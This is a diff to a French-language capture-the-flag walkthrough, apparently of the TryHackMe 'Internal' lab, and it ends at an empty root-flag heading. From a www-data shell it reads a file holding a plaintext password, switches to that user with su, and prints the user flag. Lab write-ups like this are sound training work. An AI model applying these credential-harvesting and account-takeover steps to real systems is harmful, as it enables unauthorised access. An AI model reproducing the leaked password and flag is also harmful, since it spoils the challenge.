@@ -184,3 +184,58 @@ www-data@internal:/$ whoami
 whoami
 www-data
 ```
+
+Dans le dossier /opt nous pouvons voir un fichier nommé wp-save.txt, regardons ce qu'il y a à l'intérieur:
+
+```
+$ cat wp-save.txt
+Bill,
+
+Aubreanna needed these credentials for something later.  Let her know you have them and where they are.
+
+aubreanna:bubb13guM!@#123
+```
+Bien joué, nous obtenons le mdp de aubreanna, connectons nous
+
+```
+www-data@internal:/opt$ su aubreanna
+su aubreanna
+Password: bubb13guM!@#123
+
+aubreanna@internal:/opt$ whoami
+whoami
+aubreanna
+```
+
+### User Flag
+Le flag utilisateur est caché dans les fichier de aubreanna
+
+```
+aubreanna@internal:/opt$ cd /home/aubreanna
+cd /home/aubreanna
+aubreanna@internal:~$ ls -la
+ls -la
+total 56
+drwx------ 7 aubreanna aubreanna 4096 Aug  3 03:57 .
+drwxr-xr-x 3 root      root      4096 Aug  3 01:40 ..
+-rwx------ 1 aubreanna aubreanna    7 Aug  3 20:01 .bash_history
+-rwx------ 1 aubreanna aubreanna  220 Apr  4  2018 .bash_logout
+-rwx------ 1 aubreanna aubreanna 3771 Apr  4  2018 .bashrc
+drwx------ 2 aubreanna aubreanna 4096 Aug  3 01:41 .cache
+drwx------ 3 aubreanna aubreanna 4096 Aug  3 19:36 .gnupg
+drwx------ 3 aubreanna aubreanna 4096 Aug  3 01:53 .local
+-rwx------ 1 root      root       223 Aug  3 01:56 .mysql_history
+-rwx------ 1 aubreanna aubreanna  807 Apr  4  2018 .profile
+drwx------ 2 aubreanna aubreanna 4096 Aug  3 02:38 .ssh
+-rwx------ 1 aubreanna aubreanna    0 Aug  3 01:41 .sudo_as_admin_successful
+-rwx------ 1 aubreanna aubreanna   55 Aug  3 03:57 jenkins.txt
+drwx------ 3 aubreanna aubreanna 4096 Aug  3 01:41 snap
+-rwx------ 1 aubreanna aubreanna   21 Aug  3 03:56 user.txt
+aubreanna@internal:~$ cat user.txt
+cat user.txt
+THM{int3rna1_fl4g_1}
+```
+
+**User Flag: `THM{int3rna1_fl4g_1}`**
+
+### Root.txt Flag
